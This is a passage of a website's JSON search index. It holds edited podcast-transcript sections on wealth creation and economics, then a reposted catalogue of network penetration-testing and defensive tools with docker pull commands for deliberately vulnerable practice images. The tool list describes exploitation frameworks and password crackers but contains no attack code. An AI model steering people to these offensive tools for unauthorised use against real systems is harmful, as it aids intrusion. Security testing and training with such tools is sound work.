turn a single-move game into a longer term game and get past a position of poor negotiating leverage and poor information.","title":"Turn Short-Term Games Into Long-Term Games"},{"location":"other/How%20to%20Get%20Rich/#compounding-relationships-make-life-easier","text":"Life gets a lot easier when you know someone\u2019s got your back Mutual trust makes it easy to do business Relationships offer a good example of compound interest. Once you\u2019ve been in a good relationship with somebody for a while\u2014whether it\u2019s business or romantic\u2014life gets a lot easier because you know that person\u2019s got your back. You don\u2019t have to keep questioning. If I\u2019m doing a deal with someone I\u2019ve worked with for 20 years and there is mutual trust, we don\u2019t have to read the legal contracts. Maybe we don\u2019t even need to create legal contracts; maybe we can do it with a handshake. That kind of trust makes it very easy to do business. If Nivi and I start another company and things aren\u2019t working out, I know we\u2019re both going to be extremely reasonable about deciding what to do\u2014how to exit or shut it down. Or if we\u2019re scaling it, how to bring in new people. We have mutual trust, and that allows us to start businesses more easily and compounds the effect. The most under-recognized reason startups fail is because the founders fall apart. A startup is so difficult to pull off, so removing potential friction points between founders can be the difference between success and failure. It\u2019s better to have a few compounding relationships than many shallow ones Nivi: There are a couple of non-intuitive things about compounding. The first is that most of the benefits come at the end, so you may not see huge benefits up front. Sam Altman wrote, \u201c I always want it to be a project that, if successful, will make the rest of my career look like a footnote .\u201d Again, most of the benefits of compounding come at the end. Another thing that\u2019s non-intuitive about compounding: It\u2019s better to have a few deep compounding relationships than many shallow, non-compounding relationships. It takes just as much effort to create a small business as a large one Naval: One thing about business that people don\u2019t realize: it takes just as much effort to create a small business as it does to create a large one. Whether you\u2019re Elon Musk or the guy running three Italian restaurants in town, you\u2019re working 80 hours a week; you\u2019re sweating bullets; you\u2019re hiring and firing people; you\u2019re trying to balance the books; it\u2019s highly stressful; and it takes years and years of your life. In one case, you get companies worth $50-$100 billion and everyone\u2019s adulation. In the other, you might make a little bit of money and you\u2019ve got some nice restaurants. So think big.","title":"Compounding Relationships Make Life Easier"},{"location":"other/How%20to%20Get%20Rich/#price-discrimination-charge-some-people-more","text":"You can charge people for extras based on their propensity to pay Price discrimination is a technique for charging certain people more Nivi: Are there any other microeconomic concepts, outside of zero marginal cost of replication and scale economies , that are important to understand? Naval: Price discrimination is important. It means you can charge people based on their propensity to pay. Now, you can\u2019t charge people different amounts just because you don\u2019t like them. You have to offer them something extra. But it has to be something rich people care about. Business-class seats routinely cost five or 10 times more than economy seats. But it costs the airline much less\u2014maybe two or three times more than a standard seat\u2014to provide perks like wider seats, more legroom and free drinks. Rich people and large enterprises are willing to pay more Price discrimination works because rich people are willing to pay more. You just have to give them the extra little things they need to signal they\u2019re rich or that little bit of comfort they want. A lot of enterprise software companies use price discrimination, especially with freemium products. The free or low-price version will do almost everything you want. But if you want the version that\u2019s extra secure or hosted on your site or has multiple-user administration so the IT person can monitor everything, you\u2019ll find yourself paying 10 or 100 times more.","title":"Price Discrimination: Charge Some People More"},{"location":"other/How%20to%20Get%20Rich/#consumer-surplus-getting-more-than-you-paid-for","text":"People are willing to pay more than what companies charge Consumer surplus is the extra value you get when you pay less than you were willing Naval: Consumer surplus and producer surplus are important concepts. Consumer surplus is the excess value you get from something when you pay less than you were willing to pay. I get a lot of joy out of my morning Starbucks coffee. Obviously I\u2019ve made some money. So if my coffee cost $20, I would pay it. But Starbucks doesn\u2019t know that. They can\u2019t price the coffee at $20 just for me, because they\u2019re selling the exact same product to others. So I\u2019m getting a lot of consumer surplus out of the coffee. All businesses generate consumer surplus. It\u2019s a good thing to keep in mind when someone\u2019s harping on about how evil companies are. Amazon might be a trillion-dollar company, but I\u2019ll bet they\u2019re generating trillions of dollars in consumer surplus through people\u2019s willingness to pay for convenience. A lot of people are willing to pay more than what Amazon charges.","title":"Consumer Surplus: Getting More Than You Paid For"},{"location":"other/How%20to%20Get%20Rich/#net-present-value-what-future-income-is-worth-today","text":"See what future income is worth today by applying a discount to its future value Figure out what future income is worth today by applying a discount rate Nivi: Let\u2019s talk about net present value (NPV). Naval: Net present value is when you say, \u201cThat stream of payments I\u2019m going to get in the future\u2014what\u2019s it worth today?\u201d Here\u2019s a common example: You\u2019re joining a startup and getting stock options, and the founder says, \u201cThis company is going to be worth $1 billion, and I\u2019m giving you 0.1% of the company; therefore, you\u2019re getting $1 million worth of stock.\u201d The founder is negotiating based on what it\u2019s going to be worth in the future. You have to figure out what it\u2019s worth today by applying a discount rate, or an interest rate, that accounts for the massive risk startups face. You\u2019ll end up with the amount the company is actually worth today. That\u2019s the price at which a venture capitalist would invest in the company. If the founder recently raised a round at a $10 million valuation, then the company\u2019s only worth 1% of what the founder says it will be worth. So your $1 million package is actually worth $10,000. You should get very comfortable doing rough net present value calculations in your head.","title":"Net Present Value: What Future Income Is Worth Today"},{"location":"other/How%20to%20Get%20Rich/#externalities-calculating-the-hidden-costs-of-products","text":"Externalities let you account for the true cost of products by including hidden costs Nivi: What\u2019s a mispriced externality ? You mentioned it on a previous episode . Naval : An externality is where there\u2019s an additional cost imposed by whatever product is being produced or consumed, that\u2019s not accounted for in the price of the product. This can happen for many reasons. Sometimes you can fix it by putting the cost back into the price. Some of the most ardent critics of capitalism argue it\u2019s destroying the environment. If you throw away capitalism because it\u2019s destroying the environment, then guess what\u2014we\u2019re all headed back to pre-industrial times. That\u2019s not going to be a good thing. Pricing externalities properly is more effective than feel-good measures Because the environment is finite and precious, we have to price it properly and fold that back into the cost of products and services. If people are wasting water, releasing hydrocarbons into the atmosphere or polluting in other ways, society should charge them what it costs to clean up the pollution and return the environment to a pristine state. Perhaps that price has to be very, very, very high. If you raise the price high enough, you\u2019ll knock out pollution. That\u2019s much better than feel-good measures like banning plastic bags or restricting showers during a drought. Properly pricing externalities can save resources in a tremendous way California likes to run declarations and ads to scare people into avoiding showers during droughts. It would be better to raise the price of fresh water. The average consumer might pay a few pennies more for a shower, but the almond farmers\u2014who consume a lot of water\u2014will cut back; and almond farming may move to a part of the country where water is more abundant. Properly pricing externalities can save resources in a tremendous way. It\u2019s a good framework to use when you want to do things like save the environment, rather than doing feel-good things that won\u2019t actually amount to anything.","title":"Externalities: Calculating the Hidden Costs of Products"},{"location":"other/How%20to%20Get%20Rich/#bonus-finding-time-to-invest-in-yourself","text":"If you have to work a \u201cnormal job,\u201d take on accountability to build your specific knowledge Nivi: A common question we get: \u201cHow do I find the time to start investing in myself? I have a job.\u201d You have to rent your time to get started In one of the tweets from the cutting room floor, you wrote: \u201cYou will need to rent your time to get started. This is only acceptable when you are learning and saving. Preferably in a business where society does not yet know how to train people and apprenticeship is the only model.\u201d Naval: Try to learn something that people haven\u2019t quite figured out how to teach yet. That can happen if you\u2019re working in a new and quickly expanding field. It\u2019s also common in fields that are circumstantial\u2014where the details matter and it\u2019s always moving. Investing is one of those fields; so is entrepreneurship. Chief of staff for a founder is one of the most coveted jobs for young people starting out in Silicon Valley. The brightest kids will follow an entrepreneur around and do whatever he or she needs them to do. In many cases, the person is way overqualified. Someone with multiple graduate degrees might be running the CEO\u2019s laundry because that\u2019s the most important thing at the moment. At the same time, that person gets to attend the most important meetings. They are privy to all the stress and theatrics, the fundraising decks and the innovation\u2014knowledge that can only come from being in the room. Coming out of college, Warren Buffett wanted to work for Benjamin Graham to learn to be a value investor. Buffett offered to work for free, and Graham responded, \u201cYou\u2019re overpriced.\u201d What that means is you have to make sacrifices to take on an apprenticeship. Find the part of the job with the steepest learning curve If can\u2019t learn in an apprenticeship model because you need to make money, try to be innovative in the context of your job. Take on new challenges and responsibilities. Find the part of the job with the steepest learning curve. You want to avoid repetitive drudgery\u2014that\u2019s just biding time until your job is automated away. If you\u2019re a barista at the coffee shop, figure out how to make connections with the customers. Figure out how to innovate the service you offer and delight the customer. Managers, founders and owners will take notice. Develop a founder mentality The hardest thing for any founder is finding employees with a founder mentality. This is a fancy way of saying they care enough. People will say, \u201cWell, I\u2019m not the founder. I\u2019m not being paid enough to care.\u201d Actually, you are: The knowledge and skills you gain by developing a founder mentality set you up to be a founder down the line; that\u2019s your compensation. You can get a lot out of almost any position. You just have to put a lot into it. Accountability is something you can take on immediately Nivi: We\u2019ve discussed accountability, judgment, specific knowledge and leverage. If I\u2019m working a \u201cnormal\u201d job, is specific knowledge the one I should focus on? Naval: Judgment takes experience. It takes a lot of time to build up. You have to put yourself in positions where you can exercise judgment. That\u2019ll come from taking on accountability. Leverage is something that society gives you after you\u2019ve demonstrated judgment. You can get it faster by learning high-leverage skills like coding or working with the media. These are permissionless leverage. This is why I encourage people to learn to code or produce media, even if it\u2019s just nights and weekends. So, judgment and leverage tend to come later. Accountability is something you can take on immediately. You can say, \u201cHey, I\u2019ll take charge of this thing that nobody wants to take charge of.\u201d When you take on accountability, you\u2019re also publicly putting your neck on the chopping block\u2014so you have to deliver. You build specific knowledge by taking accountability for things that other people don\u2019t know how to do. Perhaps they\u2019re things you enjoy doing or are naturally inclined towards doing anyway. If you work in a factory, the hardest thing may be raising capital to keep the factory running. Maybe that\u2019s what the owner is always stressed out about. You might notice this and think, \u201cI\u2019m good at balancing my checkbook and have a good head for numbers; but I haven\u2019t raised money before.\u201d You offer to help and become the owner\u2019s sidekick solving their fundraising problem. If you have a natural aptitude and take on accountability, you can put yourself in a position to learn quickly. Before long, you\u2019ll become the heir apparent. Early on, find things that interest you and allow you to take on accountability. Don\u2019t worry about short-term compensation. Compensation comes when you\u2019re tired of waiting for it and have given up on it. This is the way the whole system works. If you take on accountability and solve problems on the edge of knowledge that others can\u2019t solve, people will line up behind you. The leverage will come. Specific knowledge can be timely or timeless There are two forms of specific knowledge: timely and timeless . If you become a world-class expert in machine learning just as it takes off and you got there through genuine intellectual interest, you\u2019re going to do really well. But 20 years from now, machine learning may be second hat; the world may have moved on to something else. That\u2019s timely knowledge. If you\u2019re good at persuading people, it\u2019s probably a skill you picked up early on in life. It\u2019s always going to apply, because persuading people is always going to be valuable. That\u2019s timeless knowledge. Now, persuasion is a generic skill\u2014it\u2019s probably not enough to build a career on. You need to combine it in a skill stack, as Scott Adams writes . You might combine persuasion with accounting and an understanding of semiconductor production lines. Now you can become the best semiconductor salesperson and, later on, the best semiconductor company CEO. Timeless specific knowledge usually can\u2019t be taught, and it sticks with you forever. Timely specific knowledge comes and goes; but it tends to have a fairly long shelf life. Technology is a good place to find those timely skills sets. If you can bring in a more generic specialized knowledge skill set from the outside, then you\u2019ve got gold. Technology is an intellectual frontier for gaining specific knowledge Nivi: There were a couple other tweets from the cutting-room floor on this topic. The first: \u201cThe technology industry is a great place to acquire specific knowledge. The frontier is always moving forward. If you are genuinely intellectually curious, you will acquire the knowledge ahead of others.\u201d Naval: Danny Hillis famously said technology is everything that doesn\u2019t work yet . Technology is around us everywhere. The spoon was technology once; fire was technology once. When we figured out how to make them work, they disappeared in the background and became part of our everyday lives. Technology is, by definition, the intellectual frontier. It\u2019s taking things from science and culture that we have not figured out how to mass produce or create efficiently and figuring out how to commercialize it and make it available to everybody. Technology will always be a great field where you can pick up specific knowledge that is valuable to society. If you don\u2019t have accountability, do something different Nivi: Here\u2019s another tweet from the cutting-room floor related to accountability: \u201cCompanies don\u2019t know how to measure outputs, so they measure inputs instead. Work in a way that your outputs are visible and measurable. If you don\u2019t have accountability, do something different.\u201d Naval: The entire structure of rewarding people comes from the agricultural and industrial ages, when inputs and outputs matched up closely. The amount of hours you put into doing something was a reliable proxy for what kind of output you\u2019d get. Today, it\u2019s extremely nonlinear. One good investment decision can make a company $10 million or $100 million. One good product feature can be the difference between product-market fit and complete failure. As a result, judgment and accountability matter much more. Often the best engineers aren\u2019t the hardest workers. Sometimes they don\u2019t work very hard at all, but they dependably ship that one critical product at just the right time. It\u2019s similar to the salesperson who closes the huge deal that makes the company\u2019s numbers for the quarter. People need to be able to tell what role you had in the company\u2019s success. That doesn\u2019t mean stomping all over your team\u2014people are extremely sensitive to others taking too much credit. You always want to be giving out credit. Smart people will know who was responsible. Some jobs are too removed from the customer for this type of accountability. You\u2019re just a cog in a machine. Consulting is a good example. As a consultant, your ideas are delivered through someone else within the organization. You may not have visibility to the top people; you may be hidden behind a screen. That\u2019s a trade-off you\u2019re making in exchange for your independence. You\u2019ll develop thick-skin if you take on accountability When you have accountability, you get a lot more credit when things go right. Of course, the downside is you get hurt a lot more when things go wrong. When you stick your neck out, you have to be willing to be blamed, sacrificed and even attacked. If you\u2019re the kind of person who thrives in a high-accountability environment, you\u2019re going to end up thick-skinned over time. You\u2019re going to get hurt a lot. People are going to attack you if you fail. Scale your specific knowledge with apprentices Nivi: Once you get some specific knowledge, you can scale it by training your own apprentices and outsourcing tasks to them. Naval: For example, I made good investments and figured out the venture business. I could have kept doing that and making money. Instead, I co-founded Spearhead to train up-and-coming founders to become angels and venture investors. We give them a checkbook to start investing. It\u2019s an apprenticeship model. They come to us with deals they\u2019re looking at, and we help them think it through. This model is more scalable than my personal investing. Specific knowledge comes on the job, not in a classroom At Spearhead we lead classes teaching founders about investing, and we also hold office hours to discuss specific deals they bring. It turns out the classes and talks we lead are largely worthless. You can give all the generic advice people need in about an hour. After that, the advice gets so circumstantial that it essentially cancels to zero. But the office hours are incredibly useful. This reinforces the notion that investing is one of those skills that can only be learned on the job. When you find a skill like that, you\u2019re dealing with specific knowledge. Another good indicator of specific knowledge is when someone can\u2019t give a straight answer to the question: \u201cWhat do you do every day?\u201d Or you get an answer along the lines of, \u201cEvery day is different based on what\u2019s going on.\u201d The thing is so complicated and dependent upon circumstances that it can\u2019t be boiled down into a textbook form. Nivi: The mafia figured out this apprenticeship model a long time ago. The best way to end up running one of the families was to become the driver for the Don. Naval: Tony Soprano was a businessman who had to enforce his own contracts. That\u2019s a very complicated business. This transcript has been edited for clarity. \u539f\u6587\u94fe\u63a5\uff1a https://nav.al/rich","title":"Bonus: Finding Time to Invest in Yourself"},{"location":"other/Most%20Important%20Network%20Penetration%20Testing%20Tools%20for%20Hackers%20%26%20Security%20Professionals/","text":"Most Important Network Penetration Testing Tools for Hackers & Security Professionals Network Security tools for Penetration testing is more often used by security industries to test the vulnerabilities in network and applications. Here you can find the Comprehensive Network Security Tools list that covers Performing Penetration testing Operation in all the Environment. Learn : M aster in Ethical Hacking & Penetration Testing Online \u2013 Scratch to Advance Level Network Security Tools Scanning / Pentesting OpenVAS \u2013 OpenVAS is a framework of several services and tools offering a comprehensive and powerful vulnerability scanning and vulnerability management solution. Metasploit Framework \u2013 one fo the best Network Security Tools for developing and executing exploit code against a remote target machine. Other important sub-projects include the Opcode Database, shellcode archive and related research. Kali \u2013 Kali Linux is a Debian-derived Linux distribution designed for digital forensics and penetration testing. Kali Linux is preinstalled with numerous penetration-testing programs, including nmap (a port scanner), Wireshark (a packet analyzer), John the Ripper (a password cracker), and Aircrack-ng (a software suite for penetration-testing wireless LANs). pig \u2013 A Linux packet crafting tool. scapy \u2013 Scapy: the python-based interactive packet manipulation program & library. Pompem \u2013 Pompem is an open-source Network Security Tools, which is designed to automate the search for exploits in major databases. Developed in Python, has a system of advanced search, thus facilitating the work of pentesters and ethical hackers. In its current version, performs searches in databases: Exploit-db, 1337day, Packetstorm Security\u2026 Nmap \u2013 Nmap is a free and open-source utility for network discovery and security auditing. Monitoring / Logging justniffer \u2013 Justniffer is a network protocol analyzer that captures network traffic and produces logs in a customized way, can emulate Apache web server log files, track response times and extract all \u201cintercepted\u201d files from the HTTP traffic. httpry \u2013 httpry is a specialized packet sniffer designed for displaying and logging HTTP traffic. It is not intended to perform analysis itself, but to capture, parse, and log the traffic for later analysis. It can be run in real-time displaying the traffic as it is parsed, or as a daemon process that logs to an output file. It is written to be as lightweight and flexible as possible, so that it can be easily adaptable to different applications. ngrep \u2013 ngrep strives to provide most of GNU grep\u2019s common features, applying them to the network layer. ngrep is a pcap-aware tool that will allow you to specify extended regular or hexadecimal expressions to match against data payloads of packets. It currently recognizes IPv4/6, TCP, UDP, ICMPv4/6, IGMP and Raw across Ethernet, PPP, SLIP, FDDI, Token Ring and null interfaces, and understands BPF filter logic in the same fashion as more common packet sniffing tools, such as tcpdump and snoop. passivedns \u2013 one of the best Network Security Tools to collect DNS records passively to aid Incident handling, Network Security Monitoring (NSM) and general digital forensics. PassiveDNS sniffs traffic from an interface or reads a pcap-file and outputs the DNS-server answers to a log file. PassiveDNS can cache/aggregate duplicate DNS answers in-memory, limiting the amount of data in the logfile without loosing the essens in the DNS answer. sagan \u2013 Sagan uses a \u2018Snort like\u2019 engine and rules to analyze logs (syslog/event log/snmptrap/netflow/etc). Node Security Platform \u2013 Similar feature set to Snyk, but free in most cases, and very cheap for others. ntopng \u2013 Ntopng is a network traffic probe that shows the network usage, similar to what the popular top Unix command does. Fibratus \u2013 Fibratus is a tool for exploration and tracing of the Windows kernel. It is able to capture the most of the Windows kernel activity \u2013 process/thread creation and termination, file system I/O, registry, network activity, DLL loading/unloading and much more. Fibratus has a very simple CLI which encapsulates the machinery to start the kernel event stream collector, set kernel event filters or run the lightweight Python modules called filaments. Also Read: Most Important Android Security Penetration Testing Tools for Hackers & Security Professionals IDS / IPS / Host IDS / Host IPS Snort \u2013 Snort is a free and open source network intrusion prevention system (NIPS) and network intrusion detection system (NIDS)created by Martin Roesch in 1998. Snort is now developed by Sourcefire, of which Roesch is the founder and CTO. In 2009, Snort entered InfoWorld\u2019s Open Source Hall of Fame as one of the \u201cgreatest [pieces of] open source software of all time\u201d. Bro \u2013 Bro is a powerful network analysis framework that is much different from the typical IDS you may know. OSSEC \u2013 Comprehensive Open Source HIDS. Not for the faint of heart. Takes a bit to get your head around how it works. Performs log analysis, file integrity checking, policy monitoring, rootkit detection, real-time alerting and active response. It runs on most operating systems, including Linux, MacOS, Solaris, HP-UX, AIX and Windows. Plenty of reasonable documentation. Sweet spot is medium to large deployments. Suricata \u2013 Suricata is a high performance Network IDS, IPS and Network Security Monitoring engine. Open Source and owned by a community run non-profit foundation, the Open Information Security Foundation (OISF). Suricata is developed by the OISF and its supporting vendors. Security Onion \u2013 Security Onion is a Linux distro for intrusion detection, network security monitoring, and log management. It\u2019s based on Ubuntu and contains Snort, Suricata, Bro, OSSEC, Sguil, Squert, Snorby, ELSA, Xplico, NetworkMiner, and many other security tools. The easy-to-use Setup wizard allows you to build an army of distributed sensors for your enterprise in minutes! sshwatch \u2013 IPS for SSH similar to DenyHosts written in Python. It also can gather information about the attacker during the attack in a log. Stealth \u2013 File integrity checker that leaves virtually no sediment. Controller runs from another machine, which makes it hard for an attacker to know that the file system is being checked at defined pseudo random intervals over SSH. Highly recommended for small to medium deployments. AIEngine \u2013 AIEngine is a next-generation interactive/programmable Python/Ruby/Java/Lua packet inspection engine with capabilities of learning without any human intervention, NIDS(Network Intrusion Detection System) functionality, DNS domain classification, network collector, network forensics and many others. Denyhosts \u2013 Thwart SSH dictionary based attacks and brute force attacks. Fail2Ban \u2013 Scans log files and takes action on IPs that show malicious behavior. SSHGuard \u2013 A software to protect services in addition to SSH, written in C Lynis \u2013 an open source security auditing tool for Linux/Unix. Honey Pot / Honey Net HoneyPy \u2013 HoneyPy is a low to medium interaction honeypot. It is intended to be easy to: deploy, extend functionality with plugins, and apply custom configurations. Dionaea \u2013 Dionaea is meant to be a nepenthes successor, embedding python as scripting language, using libemu to detect shellcodes, supporting ipv6 and tls. Conpot \u2013 ICS/SCADA Honeypot. Conpot is a low interactive server side Industrial Control Systems honeypot designed to be easy to deploy, modify and extend. By providing a range of common industrial control protocols we created the basics to build your own system, capable to emulate complex infrastructures to convince an adversary that he just found a huge industrial complex Amun \u2013 Amun Python-based low-interaction Honeypot. Glastopf \u2013 Glastopf is a Honeypot which emulates thousands of vulnerabilities to gather data from attacks targeting web applications. The principle behind it is very simple: Reply the correct response to the attacker exploiting the web application. Kippo \u2013 Kippo is a medium interaction SSH honeypot designed to log brute force attacks and, most importantly, the entire shell interaction performed by the attacker. Kojoney \u2013 Kojoney is a low level interaction honeypot that emulates an SSH server. The daemon is written in Python using the Twisted Conch libraries. HonSSH \u2013 HonSSH is a high-interaction Honey Pot solution. HonSSH will sit between an attacker and a honey pot, creating two separate SSH connections between them. Bifrozt \u2013 Bifrozt is a NAT device with a DHCP server that is usually deployed with one NIC connected directly to the Internet and one NIC connected to the internal network. What differentiates Bifrozt from other standard NAT devices is its ability to work as a transparent SSHv2 proxy between an attacker and your honeypot. HoneyDrive \u2013 HoneyDrive is the premier honeypot Linux distro. It is a virtual appliance (OVA) with Xubuntu Desktop 12.04.4 LTS edition installed. It contains over 10 pre-installed and pre-configured honeypot software packages such as Kippo SSH honeypot, Dionaea and Amun malware honeypots, Honeyd low-interaction honeypot, Glastopf web honeypot and Wordpot, Conpot SCADA/ICS honeypot, Thug and PhoneyC honeyclients and more. Cuckoo Sandbox \u2013 Cuckoo Sandbox is an Open Source software for automating analysis of suspicious files. To do so it makes use of custom components that monitor the behavior of the malicious processes while running in an isolated environment. Full Packet Capture / Forensic tcpflow \u2013 tcpflow is a program that captures data transmitted as part of TCP connections (flows), and stores the data in a way that is convenient for protocol analysis and debugging. Xplico \u2013 The goal of Xplico is extract from an internet traffic capture the applications data contained. For example, from a pcap file Xplico extracts each email (POP, IMAP, and SMTP protocols), all HTTP contents, each VoIP call (SIP), FTP, TFTP, and so on. Xplico isn\u2019t a network protocol analyzer. Xplico is an open source Network Forensic Analysis Tool (NFAT). Moloch \u2013 Moloch is an open source, large scale IPv4 packet capturing (PCAP), indexing and database system. A simple web interface is provided for PCAP browsing, searching, and exporting. APIs are exposed that allow PCAP data and JSON-formatted session data to be downloaded directly. Simple security is implemented by using HTTPS and HTTP digest password support or by using apache in front. Moloch is not meant to replace IDS engines but instead work along side them to store and index all the network traffic in standard PCAP format, providing fast access. Moloch is built to be deployed across many systems and can scale to handle multiple gigabits/sec of traffic. OpenFPC \u2013 OpenFPC is a set of tools that combine to provide a lightweight full-packet network traffic recorder & buffering system. It\u2019s design goal is to allow non-expert users to deploy a distributed network traffic recorder on COTS hardware while integrating into existing alert and log management tools. Dshell \u2013 Dshell is a network forensic analysis framework. Enables rapid development of plugins to support the dissection of network packet captures. stenographer \u2013 Stenographer is a packet capture solution which aims to quickly spool all packets to disk, then provide simple, fast access to subsets of those packets. Sniffer based Network Security Tools wireshark \u2013 Wireshark is a free and open-source packet analyzer. It is used for network troubleshooting, analysis, software and communications protocol development, and education. Wireshark is very similar to tcpdump, but has a graphical front-end, plus some integrated sorting and filtering options. netsniff-ng \u2013 netsniff-ng is a free Linux networking toolkit, a Swiss army knife for your daily Linux network plumbing if you will. Its gain of performance is reached by zero-copy mechanisms, so that on packet reception and transmission the kernel does not need to copy packets from kernel space to user space and vice versa. Live HTTP headers \u2013 Live HTTP headers is a free firefox addon to see your browser requests in real time. It shows the entire headers of the requests and can be used to find the security loopholes in implementations. SIEM \u2013 Network Security Tools Prelude \u2013 Prelude is a Universal \u201cSecurity Information & Event Management\u201d (SIEM) system. Prelude collects, normalizes, sorts, aggregates, correlates and reports all security-related events independently of the product brand or license giving rise to such events; Prelude is \u201cagentless\u201d. OSSIM \u2013 OSSIM provides all of the features that a security professional needs from a SIEM offering \u2013 event collection, normalization, and correlation. FIR \u2013 Fast Incident Response, a cybersecurity incident management platform. VPN OpenVPN \u2013 OpenVPN is an open source software application that implements virtual private network (VPN) techniques for creating secure point-to-point or site-to-site connections in routed or bridged configurations and remote access facilities. It uses a custom security protocol that utilizes SSL/TLS for key exchange. Fast Packet Processing DPDK \u2013 DPDK is a set of libraries and drivers for fast packet processing. PFQ \u2013 PFQ is a functional networking framework designed for the Linux operating system that allows efficient packets capture/transmission (10G and beyond), in-kernel functional processing and packets steering across sockets/end-points. PF_RING \u2013 PF_RING is a new type of network socket that dramatically improves the packet capture speed. PF_RING ZC (Zero Copy) \u2013 PF_RING ZC (Zero Copy) is a flexible packet processing framework that allows you to achieve 1/10 Gbit line rate packet processing (both RX and TX) at any packet size. It implements zero copy operations including patterns for inter-process and inter-VM (KVM) communications. PACKET_MMAP/TPACKET/AF_PACKET \u2013 It\u2019s fine to use PACKET_MMAP to improve the performance of the capture and transmission process in Linux. netmap \u2013 netmap is a framework for high speed packet I/O. Together with its companion VALE software switch, it is implemented as a single kernel module and available for FreeBSD, Linux and now also Windows. Firewall based Network Security Tools pfSense \u2013 Firewall and Router FreeBSD distribution. OPNsense \u2013 is an open source, easy-to-use and easy-to-build FreeBSD based firewall and routing platform. OPNsense includes most of the features available in expensive commercial firewalls, and more in many cases. It brings the rich feature set of commercial offerings with the benefits of open and verifiable sources. fwknop \u2013 Protects ports via Single Packet Authorization in your firewall. Anti-Spam SpamAssassin \u2013 A powerful and popular email spam filter employing a variety of detection technique. Docker Images for Penetration Testing & Security docker pull kalilinux/kali-linux-docker official Kali Linux docker pull owasp/zap2docker-stable \u2013 official OWASP ZAP docker pull wpscanteam/wpscan \u2013 official WPScan docker pull remnux/metasploit \u2013 docker-metasploit docker pull citizenstig/dvwa \u2013 Damn Vulnerable Web Application (DVWA) docker pull wpscanteam/vulnerablewordpress \u2013 Vulnerable WordPress Installation docker pull hmlio/vaas-cve-2014-6271 \u2013 Vulnerability as a service: Shellshock docker pull hmlio/vaas-cve-2014-0160 \u2013 Vulnerability as a service: Heartbleed docker pull opendns/security-ninjas \u2013 Security Ninjas docker pull diogomonica/docker-bench-security \u2013 Docker Bench for Security docker pull ismisepaul/securityshepherd \u2013 OWASP Security Shepherd docker pull danmx/docker-owasp-webgoat \u2013 OWASP WebGoat Project docker image docker-compose build && docker-compose up \u2013 OWASP NodeGoat docker pull citizenstig/nowasp \u2013 OWASP Mutillidae II Web Pen-Test Practice Application You can follow us on Linkedin , Twitter , Facebook for daily Cybersecurity updates also you can take the Best Cybersecurity courses online to keep your self-updated. \u539f\u6587\u94fe\u63a5\uff1a https://gbhackers.com/network-security-tools/","title":"Most Important Network Penetration Testing Tools for Hackers & Security Professionals"},{"location":"other/Most%20Important%20Network%20Penetration%20Testing%20Tools%20for%20Hackers%20%26%20Security%20Professionals/#most-important-network-penetration-testing-tools-for-hackers-security-professionals","text":"Network Security tools for Penetration testing is more often used by security industries to test the vulnerabilities in network and applications. Here you can find the Comprehensive Network Security Tools list that covers Performing Penetration testing Operation in all the Environment. Learn : M aster in Ethical Hacking & Penetration Testing Online \u2013 Scratch to Advance Level","title":"Most Important Network Penetration Testing Tools for Hackers &amp; Security Professionals"},{"location":"other/Most%20Important%20Network%20Penetration%20Testing%20Tools%20for%20Hackers%20%26%20Security%20Professionals/#network-security-tools","text":"","title":"Network Security Tools"},{"location":"other/Most%20Important%20Network%20Penetration%20Testing%20Tools%20for%20Hackers%20%26%20Security%20Professionals/#scanning-pentesting","text":"OpenVAS \u2013 OpenVAS is a framework of several services and tools offering a comprehensive and powerful vulnerability scanning and vulnerability management solution. Metasploit Framework \u2013 one fo the best Network Security Tools for developing and executing exploit code against a remote target machine. Other important sub-projects include the Opcode Database, shellcode archive and related research. Kali \u2013 Kali Linux is a Debian-derived Linux distribution designed for digital forensics and penetration testing. Kali Linux is preinstalled with numerous penetration-testing programs, including nmap (a port scanner), Wireshark (a packet analyzer), John the Ripper (a password cracker), and Aircrack-ng (a software suite for penetration-testing wireless LANs). pig \u2013 A Linux packet crafting tool. scapy \u2013 Scapy: the python-based interactive packet manipulation program & library. Pompem \u2013 Pompem is an open-source Network Security Tools, which is designed to automate the search for exploits in major databases. Developed in Python, has a system of advanced search, thus facilitating the work of pentesters and ethical hackers. In its current version, performs searches in databases: Exploit-db, 1337day, Packetstorm Security\u2026 Nmap \u2013 Nmap is a free and open-source utility for network discovery and security auditing.","title":"Scanning / Pentesting"},{"location":"other/Most%20Important%20Network%20Penetration%20Testing%20Tools%20for%20Hackers%20%26%20Security%20Professionals/#monitoring-logging","text":"justniffer \u2013 Justniffer is a network protocol analyzer that captures network traffic and produces logs in a customized way, can emulate Apache web server log files, track response times and extract all \u201cintercepted\u201d files from the HTTP traffic. httpry \u2013 httpry is a specialized packet sniffer designed for displaying and logging HTTP traffic. It is not intended to perform analysis itself, but to capture, parse, and log the traffic for later analysis. It can be run in real-time displaying the traffic as it is parsed, or as a daemon process that logs to an output file. It is written to be as lightweight and flexible as possible, so that it can be easily adaptable to different applications. ngrep \u2013 ngrep strives to provide most of GNU grep\u2019s common features, applying them to the network layer. ngrep is a pcap-aware tool that will allow you to specify extended regular or hexadecimal expressions to match against data payloads of packets. It currently recognizes IPv4/6, TCP, UDP, ICMPv4/6, IGMP and Raw across Ethernet, PPP, SLIP, FDDI, Token Ring and null interfaces, and understands BPF filter logic in the same fashion as more common packet sniffing tools, such as tcpdump and snoop. passivedns \u2013 one of the best Network Security Tools to collect DNS records passively to aid Incident handling, Network Security Monitoring (NSM) and general digital forensics. PassiveDNS sniffs traffic from an interface or reads a pcap-file and outputs the DNS-server answers to a log file. PassiveDNS can cache/aggregate duplicate DNS answers in-memory, limiting the amount of data in the logfile without loosing the essens in the DNS answer. sagan \u2013 Sagan uses a \u2018Snort like\u2019 engine and rules to analyze logs (syslog/event log/snmptrap/netflow/etc). Node Security Platform \u2013 Similar feature set to Snyk, but free in most cases, and very cheap for others. ntopng \u2013 Ntopng is a network traffic probe that shows the network usage, similar to what the popular top Unix command does. Fibratus \u2013 Fibratus is a tool for exploration and tracing of the Windows kernel. It is able to capture the most of the Windows kernel activity \u2013 process/thread creation and termination, file system I/O, registry, network activity, DLL loading/unloading and much more. Fibratus has a very simple CLI which encapsulates the machinery to start the kernel event stream collector, set kernel event filters or run the lightweight Python modules called filaments. Also Read: Most Important Android Security Penetration Testing Tools for Hackers & Security Professionals","title":"Monitoring / Logging"},{"location":"other/Most%20Important%20Network%20Penetration%20Testing%20Tools%20for%20Hackers%20%26%20Security%20Professionals/#ids-ips-host-ids-host-ips","text":"Snort \u2013 Snort is a free and open source network intrusion prevention system (NIPS) and network intrusion detection system (NIDS)created by Martin Roesch in 1998. Snort is now developed by Sourcefire, of which Roesch is 